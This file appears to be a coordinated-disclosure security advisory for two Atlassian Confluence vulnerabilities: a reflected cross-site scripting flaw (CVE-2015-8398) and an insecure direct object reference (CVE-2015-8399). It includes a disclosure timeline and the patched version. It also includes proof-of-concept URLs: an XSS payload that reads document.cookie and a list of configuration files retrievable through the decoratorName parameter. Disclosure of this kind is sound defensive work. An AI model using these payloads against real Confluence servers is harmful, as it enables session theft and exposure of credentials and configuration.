@@ -1,0 +1,85 @@
+[Systems Affected]
+    Product              :    Confluence
+    Company            :    Atlassian
+    Versions (1)        :    5.2 / 5.8.14 / 5.8.15
+    CVSS Score (1)  :    6.1 / Medium (classified by vendor)
+    Versions (2)        :    5.9.1 / 5.8.14 / 5.8.15
+    CVSS Score (2)  :    7.7 / High (classified by vendor)
+
+
+[Product Description]
+    Confluence is team collaboration software, where you create,
+organize and discuss work with your team. it is developed and marketed
+by Atlassian.
+
+
+[Vulnerabilities]
+    Two vulnerabilities were identified within this application:
+    (1) Reflected Cross-Site Scripting (CVE-2015-8398)
+    (2) Insecure Direct Object Reference (CVE-2015-8399)
+
+
+[Advisory Timeline]
+    26/Oct/2015 - Discovery and vendor notification
+    26/Oct/2015 - Vendor replied for Cross-Site Scripting (SEC-490)
+    26/Oct/2015 - Issue CONF-39689 created
+    27/Oct/2015 - Vendor replied for Insecure Direct Object Reference
+(SEC-491 / SEC-492)
+    27/Oct/2015 - Issue CONF-39704 created
+    16/Nov/2015 - Vendor confirmed that Cross-Site Scripting was fixed
+    19/Nov/2015 - Vendor confirmed that Insecure Direct Object
+Reference was fixed
+
+
+[Patch Available]
+    According to the vendor, upgrade to Confluence version 5.8.17
+
+
+[Description of Vulnerabilities]
+    (1) Reflected Cross-Site Scripting
+        An unauthenticated reflected Cross-site scripting was found in
+the REST API. The vulnerability is located at
+/rest/prototype/1/session/check/ and the payload used is <img src=a
+onerror=alert(document.cookie)>
+
+        [References]
+            CVE-2015-8398 / SEC-490 / CONF-39689
+
+        [PoC]
+            http://<Confluence
+Server>/rest/prototype/1/session/check/something%3Cimg%20src%3da%20onerror%3dalert%28document.cookie%29%3E
+
+
+    (2) Insecure Direct Object Reference
+        Two instances of Insecure Direct Object Reference were found
+within the application, that allows any authenticated user to read
+configuration files from the application
+
+        [References]
+            CVE-2015-8399 / SEC-491 / SEC-492 / CONF-39704
+
+        [PoC]
+            http://<Confluence
+Server>/spaces/viewdefaultdecorator.action?decoratorName=<FILE>
+            http://<Confluence
+Server>/admin/viewdefaultdecorator.action?decoratorName=<FILE>
+
+            This is an example of accepted <FILE> parameters
+            /WEB-INF/decorators.xml
+            /WEB-INF/glue-config.xml
+            /WEB-INF/server-config.wsdd
+            /WEB-INF/sitemesh.xml
+            /WEB-INF/urlrewrite.xml
+            /WEB-INF/web.xml
+            /databaseSubsystemContext.xml
+            /securityContext.xml
+            /services/statusServiceContext.xml
+            com/atlassian/confluence/security/SpacePermission.hbm.xml
+            com/atlassian/confluence/user/OSUUser.hbm.xml
+            com/atlassian/confluence/security/ContentPermissionSet.hbm.xml
+            com/atlassian/confluence/user/ConfluenceUser.hbm.xml
+
+-- 
+S3ba
+@s3bap3
+linkedin.com/in/s3bap3
